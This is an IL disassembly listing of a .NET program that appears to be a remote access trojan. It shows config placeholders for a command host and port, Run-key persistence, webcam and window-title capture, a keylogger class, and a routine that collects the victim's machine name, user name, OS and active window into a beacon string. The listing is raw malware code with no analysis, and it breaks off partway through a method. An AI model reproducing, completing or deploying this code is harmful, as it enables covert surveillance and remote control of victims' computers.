
//  Microsoft (R) .NET Framework IL Disassembler.  Version 3.5.30729.1
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern avicap32.dll
.module extern kernel32
.module extern user32.dll
.module extern user32
.module extern psapi
.module extern ntdll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Drawing
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly ClassLibrary1
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.
  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
 
.module ClassLibrary1.exe
// MVID: {912D96EA-AE79-4FA0-8540-D50A613BB616}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x00370000
 
.class private auto ansi sealed beforefieldinit ClassLibrary1.OK
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .field public static string VN
  .field public static string VR
  .field public static class [mscorlib]System.Threading.Mutex MT
  .field public static string EXE
  .field public static string DR
  .field public static string RG
  .field public static string H
  .field public static string P
  .field public static string Y
  .field public static bool BD
  .field public static bool Idr
  .field public static bool IsF
  .field public static bool Isu
  .field public static class [mscorlib]System.IO.FileInfo LO
  .field public static class [mscorlib]System.IO.FileStream FS
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer F
  .field public static string SPL
  .field public static class ClassLibrary1.kl kq
  .field private static class [System]System.Diagnostics.Process Pro
  .field public static bool Cn
  .field public static string sf
  .field public static class [System]System.Net.Sockets.TcpClient C
  .field private static class [mscorlib]System.IO.MemoryStream MeM
  .field private static uint8[] b
  .field private static string lastcap
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       245 (0xf5)
    .maxstack  1
    IL_0000:  ldstr      "[VN]"
    IL_0005:  stsfld     string ClassLibrary1.OK::VN
    IL_000a:  ldstr      "0.6.4"
    IL_000f:  stsfld     string ClassLibrary1.OK::VR
    IL_0014:  ldnull
    IL_0015:  stsfld     class [mscorlib]System.Threading.Mutex ClassLibrary1.OK::MT
    IL_001a:  ldstr      "[EXE]"
    IL_001f:  stsfld     string ClassLibrary1.OK::EXE
    IL_0024:  ldstr      "[DR]"
    IL_0029:  stsfld     string ClassLibrary1.OK::DR
    IL_002e:  ldstr      "[RG]"
    IL_0033:  stsfld     string ClassLibrary1.OK::RG
    IL_0038:  ldstr      "[H]"
    IL_003d:  stsfld     string ClassLibrary1.OK::H
    IL_0042:  ldstr      "[P]"
    IL_0047:  stsfld     string ClassLibrary1.OK::P
    IL_004c:  ldstr      "|'|'|"
    IL_0051:  stsfld     string ClassLibrary1.OK::Y
    IL_0056:  ldstr      "[BD]"
    IL_005b:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0060:  stsfld     bool ClassLibrary1.OK::BD
    IL_0065:  ldstr      "[Idr]"
    IL_006a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_006f:  stsfld     bool ClassLibrary1.OK::Idr
    IL_0074:  ldstr      "[Isf]"
    IL_0079:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_007e:  stsfld     bool ClassLibrary1.OK::IsF
    IL_0083:  ldstr      "[Isu]"
    IL_0088:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_008d:  stsfld     bool ClassLibrary1.OK::Isu
    IL_0092:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
    IL_0097:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_009c:  stsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
    IL_00a1:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_00a6:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
    IL_00ab:  ldstr      "[endof]"
    IL_00b0:  stsfld     string ClassLibrary1.OK::SPL
    IL_00b5:  ldnull
    IL_00b6:  stsfld     class ClassLibrary1.kl ClassLibrary1.OK::kq
    IL_00bb:  ldc.i4.0
    IL_00bc:  stsfld     bool ClassLibrary1.OK::Cn
    IL_00c1:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_00c6:  stsfld     string ClassLibrary1.OK::sf
    IL_00cb:  ldnull
    IL_00cc:  stsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
    IL_00d1:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_00d6:  stsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
    IL_00db:  ldc.i4     0x1401
    IL_00e0:  newarr     [mscorlib]System.Byte
    IL_00e5:  stsfld     uint8[] ClassLibrary1.OK::b
    IL_00ea:  ldstr      ""
    IL_00ef:  stsfld     string ClassLibrary1.OK::lastcap
    IL_00f4:  ret
  } // end of method OK::.cctor

  .method public static pinvokeimpl("psapi" winapi) 
          bool  EmptyWorkingSet(int64 hProcess) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NtSetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("kernel32" as "GetVolumeInformationA" nomangle ansi lasterr winapi) 
          int32  GetVolumeInformation(string&  marshal( byvalstr) lpRootPathName,
                                      string&  marshal( byvalstr) lpVolumeNameBuffer,
                                      int32 nVolumeNameSize,
                                      int32& lpVolumeSerialNumber,
                                      int32& lpMaximumComponentLength,
                                      int32& lpFileSystemFlags,
                                      string&  marshal( byvalstr) lpFileSystemNameBuffer,
                                      int32 nFileSystemNameSize) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int hwnd,
                                          int32& lpdwProcessID) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextA" nomangle ansi lasterr winapi) 
          int32  GetWindowText(native int hWnd,
                               string&  marshal( byvalstr) WinTitle,
                               int32 MaxLength) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("user32.dll" as "GetWindowTextLengthA" nomangle ansi lasterr winapi) 
          int32  GetWindowTextLength(int64 hwnd) cil managed preservesig
  {
  }
  .method public static void  DLV(string n) cil managed
  {
    // Code size       59 (0x3b)
    .maxstack  3
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string ClassLibrary1.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  ldc.i4.1
      IL_001f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0024:  ldarg.0
      IL_0025:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002a:  leave.s    IL_003a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002c:  dup
      IL_002d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0032:  stloc.0
      IL_0033:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0038:  leave.s    IL_003a

    }  // end handler
    IL_003a:  ret
  } // end of method OK::DLV

  .method public static string  GTV(string n) cil managed
  {
    // Code size       76 (0x4c)
    .maxstack  3
    .locals init (string V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string ClassLibrary1.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldstr      ""
      IL_0029:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                           object)
      IL_002e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0033:  stloc.0
      IL_0034:  leave.s    IL_004a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0036:  dup
      IL_0037:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003c:  stloc.1
      IL_003d:  ldstr      ""
      IL_0042:  stloc.0
      IL_0043:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0048:  leave.s    IL_004a

    }  // end handler
    IL_004a:  ldloc.0
    IL_004b:  ret
  } // end of method OK::GTV

  .method public static object  STV(string n,
                                    string t) cil managed
  {
    // Code size       74 (0x4a)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string ClassLibrary1.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_002a:  ldc.i4.1
      IL_002b:  box        [mscorlib]System.Boolean
      IL_0030:  stloc.0
      IL_0031:  leave.s    IL_0048

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0033:  dup
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0039:  stloc.1
      IL_003a:  ldc.i4.0
      IL_003b:  box        [mscorlib]System.Boolean
      IL_0040:  stloc.0
      IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0046:  leave.s    IL_0048

    }  // end handler
    IL_0048:  ldloc.0
    IL_0049:  ret
  } // end of method OK::STV

  .method public static string  inf() cil managed
  {
    // Code size       865 (0x361)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             string[] V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             string V_10,
             class [mscorlib]System.Exception V_11,
             string V_12,
             string V_13,
             int32 V_14,
             string[] V_15)
    IL_0000:  ldstr      "lv"
    IL_0005:  ldsfld     string ClassLibrary1.OK::Y
    IL_000a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_000f:  stloc.1
    .try
    {
      IL_0010:  ldstr      "vn"
      IL_0015:  call       string ClassLibrary1.OK::GTV(string)
      IL_001a:  ldstr      ""
      IL_001f:  ldc.i4.0
      IL_0020:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0025:  ldc.i4.0
      IL_0026:  bne.un.s   IL_0058

      IL_0028:  ldloc.1
      IL_0029:  ldsflda    string ClassLibrary1.OK::VN
      IL_002e:  call       string ClassLibrary1.OK::DEB(string&)
      IL_0033:  ldstr      "_"
      IL_0038:  call       string ClassLibrary1.OK::HWD()
      IL_003d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0042:  stloc.s    V_12
      IL_0044:  ldloca.s   V_12
      IL_0046:  call       string ClassLibrary1.OK::ENB(string&)
      IL_004b:  ldsfld     string ClassLibrary1.OK::Y
      IL_0050:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0055:  stloc.1
      IL_0056:  leave.s    IL_00b9

      IL_0058:  ldloc.1
      IL_0059:  ldstr      "vn"
      IL_005e:  call       string ClassLibrary1.OK::GTV(string)
      IL_0063:  stloc.s    V_12
      IL_0065:  ldloca.s   V_12
      IL_0067:  call       string ClassLibrary1.OK::DEB(string&)
      IL_006c:  ldstr      "_"
      IL_0071:  call       string ClassLibrary1.OK::HWD()
      IL_0076:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_007b:  stloc.s    V_13
      IL_007d:  ldloca.s   V_13
      IL_007f:  call       string ClassLibrary1.OK::ENB(string&)
      IL_0084:  ldsfld     string ClassLibrary1.OK::Y
      IL_0089:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_008e:  stloc.1
      IL_008f:  leave.s    IL_00b9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0091:  dup
      IL_0092:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0097:  stloc.3
      IL_0098:  ldloc.1
      IL_0099:  call       string ClassLibrary1.OK::HWD()
      IL_009e:  stloc.s    V_13
      IL_00a0:  ldloca.s   V_13
      IL_00a2:  call       string ClassLibrary1.OK::ENB(string&)
      IL_00a7:  ldsfld     string ClassLibrary1.OK::Y
      IL_00ac:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00b1:  stloc.1
      IL_00b2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00b7:  leave.s    IL_00b9

    }  // end handler
    .try
    {
      IL_00b9:  ldloc.1
      IL_00ba:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00bf:  ldsfld     string ClassLibrary1.OK::Y
      IL_00c4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00c9:  stloc.1
      IL_00ca:  leave.s    IL_00ec

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00cc:  dup
      IL_00cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d2:  stloc.s    V_4
      IL_00d4:  ldloc.1
      IL_00d5:  ldstr      "\?\?"
      IL_00da:  ldsfld     string ClassLibrary1.OK::Y
      IL_00df:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00e4:  stloc.1
      IL_00e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ea:  leave.s    IL_00ec

    }  // end handler
    .try
    {
      IL_00ec:  ldloc.1
      IL_00ed:  call       string [mscorlib]System.Environment::get_UserName()
      IL_00f2:  ldsfld     string ClassLibrary1.OK::Y
      IL_00f7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00fc:  stloc.1
      IL_00fd:  leave.s    IL_011f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ff:  dup
      IL_0100:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0105:  stloc.s    V_5
      IL_0107:  ldloc.1
      IL_0108:  ldstr      "\?\?"
      IL_010d:  ldsfld     string ClassLibrary1.OK::Y
      IL_0112:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0117:  stloc.1
      IL_0118:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_011d:  leave.s    IL_011f

    }  // end handler
    IL_011f:  ldloc.1
    IL_0120:  call       string ClassLibrary1.OK::FR()
    IL_0125:  ldsfld     string ClassLibrary1.OK::Y
    IL_012a:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_012f:  stloc.1
    IL_0130:  ldloc.1
    IL_0131:  ldstr      ""
    IL_0136:  ldsfld     string ClassLibrary1.OK::Y
    IL_013b:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0140:  stloc.1
    .try
    {
      IL_0141:  ldloc.1
      IL_0142:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_0147:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_014c:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_0151:  ldstr      "Microsoft"
      IL_0156:  ldstr      ""
      IL_015b:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0160:  ldstr      "Windows"
      IL_0165:  ldstr      "Win"
      IL_016a:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_016f:  ldstr      bytearray (AE 00 ) 
      IL_0174:  ldstr      ""
      IL_0179:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_017e:  ldstr      bytearray (22 21 )                                           // "!
      IL_0183:  ldstr      ""
      IL_0188:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_018d:  ldstr      "  "
      IL_0192:  ldstr      " "
      IL_0197:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_019c:  ldstr      " Win"
      IL_01a1:  ldstr      "Win"
      IL_01a6:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_01ab:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_01b0:  stloc.1
      IL_01b1:  leave.s    IL_01ce

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01b3:  dup
      IL_01b4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b9:  stloc.s    V_6
      IL_01bb:  ldloc.1
      IL_01bc:  ldstr      "\?\?"
      IL_01c1:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_01c6:  stloc.1
      IL_01c7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01cc:  leave.s    IL_01ce

    }  // end handler
    IL_01ce:  ldloc.1
    IL_01cf:  ldstr      "SP"
    IL_01d4:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01d9:  stloc.1
    .try
    {
      IL_01da:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_01df:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_01e4:  ldstr      " "
      IL_01e9:  ldc.i4.m1
      IL_01ea:  ldc.i4.0
      IL_01eb:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_01f0:  stloc.s    V_7
      IL_01f2:  ldloc.s    V_7
      IL_01f4:  ldlen
      IL_01f5:  conv.ovf.i4
      IL_01f6:  ldc.i4.1
      IL_01f7:  bne.un.s   IL_0205

      IL_01f9:  ldloc.1
      IL_01fa:  ldstr      "0"
      IL_01ff:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0204:  stloc.1
      IL_0205:  ldloc.1
      IL_0206:  ldloc.s    V_7
      IL_0208:  ldloc.s    V_7
      IL_020a:  ldlen
      IL_020b:  conv.ovf.i4
      IL_020c:  ldc.i4.1
      IL_020d:  sub.ovf
      IL_020e:  ldelem.ref
      IL_020f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0214:  stloc.1
      IL_0215:  leave.s    IL_0232

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0217:  dup
      IL_0218:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_021d:  stloc.s    V_8
      IL_021f:  ldloc.1
      IL_0220:  ldstr      "0"
      IL_0225:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_022a:  stloc.1
      IL_022b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0230:  leave.s    IL_0232

    }  // end handler
    .try
    {
      IL_0232:  ldc.i4.s   38
      IL_0234:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0239:  ldstr      "x86"
      IL_023e:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0243:  brfalse.s  IL_0258

      IL_0245:  ldloc.1
      IL_0246:  ldstr      " x64"
      IL_024b:  ldsfld     string ClassLibrary1.OK::Y
      IL_0250:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0255:  stloc.1
      IL_0256:  leave.s    IL_0286

      IL_0258:  ldloc.1
      IL_0259:  ldstr      " x86"
      IL_025e:  ldsfld     string ClassLibrary1.OK::Y
      IL_0263:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0268:  stloc.1
      IL_0269:  leave.s    IL_0286

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_026b:  dup
      IL_026c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0271:  stloc.s    V_9
      IL_0273:  ldloc.1
      IL_0274:  ldsfld     string ClassLibrary1.OK::Y
      IL_0279:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_027e:  stloc.1
      IL_027f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0284:  leave.s    IL_0286

    }  // end handler
    IL_0286:  call       bool ClassLibrary1.OK::Cam()
    IL_028b:  brfalse.s  IL_02a0

    IL_028d:  ldloc.1
    IL_028e:  ldstr      "Yes"
    IL_0293:  ldsfld     string ClassLibrary1.OK::Y
    IL_0298:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_029d:  stloc.1
    IL_029e:  br.s       IL_02b1

    IL_02a0:  ldloc.1
    IL_02a1:  ldstr      "No"
    IL_02a6:  ldsfld     string ClassLibrary1.OK::Y
    IL_02ab:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_02b0:  stloc.1
    IL_02b1:  ldloc.1
    IL_02b2:  ldsfld     string ClassLibrary1.OK::VR
    IL_02b7:  ldsfld     string ClassLibrary1.OK::Y
    IL_02bc:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_02c1:  stloc.1
    IL_02c2:  ldloc.1
    IL_02c3:  ldstr      ".."
    IL_02c8:  ldsfld     string ClassLibrary1.OK::Y
    IL_02cd:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_02d2:  stloc.1
    IL_02d3:  ldloc.1
    IL_02d4:  call       string ClassLibrary1.OK::ACT()
    IL_02d9:  ldsfld     string ClassLibrary1.OK::Y
    IL_02de:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_02e3:  stloc.1
    IL_02e4:  ldstr      ""
    IL_02e9:  stloc.2
    .try
    {
      IL_02ea:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_02ef:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_02f4:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_02f9:  ldstr      "Software\\"
      IL_02fe:  ldsfld     string ClassLibrary1.OK::RG
      IL_0303:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0308:  ldc.i4.0
      IL_0309:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string,
                                                                                                                                    valuetype [mscorlib]Microsoft.Win32.RegistryKeyPermissionCheck)
      IL_030e:  callvirt   instance string[] [mscorlib]Microsoft.Win32.RegistryKey::GetValueNames()
      IL_0313:  stloc.s    V_15
      IL_0315:  ldc.i4.0
      IL_0316:  stloc.s    V_14
      IL_0318:  br.s       IL_0340

      IL_031a:  ldloc.s    V_15
      IL_031c:  ldloc.s    V_14
      IL_031e:  ldelem.ref
      IL_031f:  stloc.s    V_10
      IL_0321:  ldloc.s    V_10
      IL_0323:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0328:  ldc.i4.s   32
      IL_032a:  bne.un.s   IL_033a

      IL_032c:  ldloc.2
      IL_032d:  ldloc.s    V_10
      IL_032f:  ldstr      ","
      IL_0334:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0339:  stloc.2
      IL_033a:  ldloc.s    V_14
      IL_033c:  ldc.i4.1
      IL_033d:  add.ovf
      IL_033e:  stloc.s    V_14
      IL_0340:  ldloc.s    V_14
      IL_0342:  ldloc.s    V_15
      IL_0344:  ldlen
      IL_0345:  conv.ovf.i4
      IL_0346:  blt.s      IL_031a

      IL_0348:  leave.s    IL_0359

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_034a:  dup
      IL_034b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0350:  stloc.s    V_11
      IL_0352:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0357:  leave.s    IL_0359

    }  // end handler
    IL_0359:  ldloc.1
    IL_035a:  ldloc.2
    IL_035b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0360:  ret
  } // end of method OK::inf

  .method public static string  FR() cil managed
  {
    // Code size       48 (0x30)
    .maxstack  2
    .locals init (string V_0,
             class [mscorlib]System.Exception V_1,
             valuetype [mscorlib]System.DateTime V_2)
    .try
    {
